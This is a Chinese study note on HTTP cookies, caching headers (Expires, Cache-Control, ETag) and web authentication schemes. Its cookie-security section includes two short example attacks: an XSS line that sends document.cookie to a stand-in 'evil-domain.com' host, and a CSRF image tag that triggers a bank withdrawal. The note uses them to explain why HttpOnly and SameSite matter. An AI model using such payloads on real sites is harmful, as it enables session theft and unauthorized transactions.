<script setup>
import Image from "../components/Image/index.vue"
</script>

# 缓存 安全与鉴权

## Cookie

HTTP Cookie（通常也叫 Web Cookie 或浏览器 Cookie），是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。支持无状态的 HTTP 变为“有状态”

- `Set-Cookie`
- Cookie 的生命周期
  - 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（Expires）或者有效期（Max-Age）；
  - 持久性 Cookie：生命周期取决于过期时间（Expires）或有效期（Max-Age）
- Cookie 的安全性
  - HttpOnly：标志的 Cookie 仅能通过 HTTP 协议访问，不能通过 JavaScript 访问，减少 XSS 攻击。
  - Secure：标志的 Cookie 仅能通过 HTTPS 协议发送给服务器，减少中间人攻击。
  - SameSite：限制第三方 Cookie，防止 CSRF 攻击。
- Cookie 的作用域
  - Domain 指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。
    例如，如果设置 Domain=chenghuai.com，则 Cookie 也包含在子域名中（如 dev.chenghuai.com）
  - Path 指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。
- SameSite
  SameSite Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，从而可以阻止（CSRF）
  1. None：浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写；
  2. Strict：浏览器将只在访问相同站点时发送 cookie；
  3. Lax：与 Strict 类似，但用户从外部站点导航至 URL 时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到 URL 时才会发送。如 link 链接；
- 安全性
  减少 Cookie 的攻击的方法：

  1. 使用 HttpOnly 属性可防止通过 JavaScript 访问 cookie 值；
  2. 用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 SameSite 属性设置为 Strict 或 Lax；
     xss:在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。

  ```js
  new Image().src =
    "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
  ```

  CSRF

  ```js
  <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
  ```

## Node 缓存

### 缓存作用

1. 为了提高速度，提高效率；
2. 减少数据传输，节省网费；
3. 减少服务器的负担，提高网站性能；
4. 加快客户端加载网页的速度；

### 缓存类型

#### 强制缓存

强制缓存不需要与服务器发生交互。

- 缓存
  1. 缓存命中 客户端请求数据，现在本地的缓存数据库中查找，如果本地缓存数据库中有该数据，且该数据没有失效。则取缓存数据库中的该数据返回给客户端；
  2. 缓存未命中 客户端请求数据，现在本地的缓存数据库中查找，如果本地缓存数据库中有该数据，且该数据失效。则向服务器请求该数据，此时服务器返回该数据和该数据的缓存规则返回给客户端，客户端收到该数据和缓存规则后，一起放到本地的缓存数据库中留存。以备下次使用；
- Expires
  这是 HTTP 1.0 的字段，表示缓存到期时间，是一个绝对的时间 (当前时间+缓存时间)。在响应消息头中，设置这个字段之后，就可以告诉浏览器，在未过期之前不需要再次请求。
  比如：Expires: Thu, 22 Mar 2029 16:06:42 GMT
  缺点：若修改电脑的本地时间，会导致浏览器判断缓存失效 这里修重新修改缓存
- Cache-control
  在得知 Expires 的缺点之后，在 HTTP/1.1 中，增加了一个字段 Cache-control，该字段表示资源缓存的最大有效时间，在该时间内，客户端不需要向服务器发送请求

  Q： Expires 和 Cache-control 区别是什么？

  1. Expires 设置的是 绝对时间 Cache-control 设置的是 相对时间；
  2. Cache-control 优先级大于 Expires
     Cache-control: max-age=20 // 表示有效时间为 20s
     res.setHeader('Cache-control', 'no-store')
     res.setHeader('Cache-control', 'max-age=20')

  cache-control 设置：

  1. no-cache：告诉浏览器忽略资源的缓存副本，强制每次请求直接发送给服务器，拉取资源，但不是“不缓存”，相当于需要使用协商缓存，禁止使用强制缓存；
  2. no-store：强制缓存在任何情况下都不要保留任何副本，相当于不使用强制缓存和协商缓存；
  3. public 任何路径的缓存者（本地缓存、代理服务器），可以无条件的缓存改资源，不设置默认为 public；
  4. private 只针对单个用户或者实体（不同用户、窗口）缓存资源；

#### 协商缓存

当强制缓存失效(超过规定时间)时，就需要使用对比缓存，由服务器决定缓存内容是否失效。对比缓存是可以和强制缓存一起使用。

- last-modified

  1. 服务器在响应头中设置 last-modified 字段返回给客户端，告诉客户端资源最后一次修改的时间；
  1. Last-Modified: Sat, 30 Mar 2029 05:46:11 GMT
  1. 浏览器在这个值和内容记录在浏览器的缓存数据库中；
  1. 下次请求相同资源，浏览器将在请求头中设置 if-modified-since 的值（这个值就是第一步响应头中的 Last-Modified 的值）传给服务器；
  1. 服务器收到请求头的 if-modified-since 的值与 last-modified 的值比较，如果相等，表示未进行修改，则返回状态码为 304；如果不相等，则修改了，返回状态码为 200，并返回数据；
     缺点：
  1. last-modified 是以秒为单位的，假如资料在 1s 内可能修改几次，那么该缓存就不能被使用的；
  1. 如果文件是通过服务器动态生成，那么更新的时间永远就是生成的时间，尽管文件可能没有变化，所以起不到缓存的作用；

- Etag
  Etag 是根据文件内容，算出一个唯一的值。服务器存储着文件的 Etag 字段。
  之后的流程和 Last-Modified 一致，只是 Last-Modified 字段和它所表示的更新时间改变成了 Etag 字段和它所表示的文件 hash，把 If-Modified-Since 变成了 If-None-Match。
  服务器同样进行比较，命中返回 304, 不命中返回新资源和 200。 Etag 的优先级高于 Last-Modified

      缺点：

1. 每次请求的时候，服务器都会把文件读取一次，以确认文件有没有修改；
2. 大文件进行 etag 一般用文件的大小 + 文件的最后修改时间 来组合生成这个 etag；

## 鉴权

目前常用的鉴权有四种：

- HTTP Basic Authentication
- session-cookie
- Token 验证
- OAuth(开放授权)

### HTTP Basic Authentication

这种授权方式是浏览器遵守 http 协议实现的基本授权方式，HTTP 协议进行通信的过程中，HTTP 协议定义了基本认证允许 HTTP 服务器对客户端进行用户身份证的方法

### session-cookie

#### cookie

Http 协议是一个无状态的协议，服务器不会知道到底是哪一台浏览器访问了它，因此需要一个标识用来让服务器区分不同的浏览器。cookie 就是这个管理服务器与客户端之间状态的标识。

1. 浏览器第一次向服务器发送请求，服务器在 response 头部设置 Set-Cookie 字段；
2. 浏览器客户端收到响应就会设置 cookie 并存储；
3. 在下一次该浏览器向服务器发送请求时，就会在 request 头部自动带上 Cookie 字段，服务器端收到该 cookie 用以区分不同的浏览器；

#### session

session 是会话的意思，浏览器第一次访问服务端，服务端就会创建一次会话，在会话中保存标识该浏览器的信息。它与 cookie 的区别就是 session 是缓存在服务端的，cookie 则是缓存在客户端，他们都由服务端生成，为了弥补 Http 协议无状态的缺陷。

#### cookie -session 认证

### token 验证

token 是一个令牌，浏览器第一次访问服务端时会签发一张令牌，之后浏览器每次携带这张令牌访问服务端就会认证该令牌是否有效，只要服务端可以解密该令牌，就说明请求是合法的，令牌中包含的用户信息还可以区分不同身份的用户

### JWT

服务器认证以后，生成一个 JSON 对象，这个 JSON 对象肯定不能裸传给用户，那谁都可以篡改这个对象发送请求。因此这个 JSON 对象会被服务器端签名加密后返回给用户，返回的内容就是一张令牌，以后用户每次访问服务器端就带着这张令牌。

<a href="https://nwy3y7fy8w5.feishu.cn/docx/ECrNdLVbvop7ITxyvTlctaGJnuc" target="_blank"  style="display: block">网络详解</a>

<a href="https://nwy3y7fy8w5.feishu.cn/docx/EG8idTDoqo1cgExeovwcC3Y5n0c" target="_blank"  style="display: block">Node 缓存 安全 鉴权</a>

<a href="https://x1mnl9knbjp.feishu.cn/docx/UKaldhN5loKq5LxRm3lcSAuTnze" target="_blank"  style="display: block">Express&Koa</a>
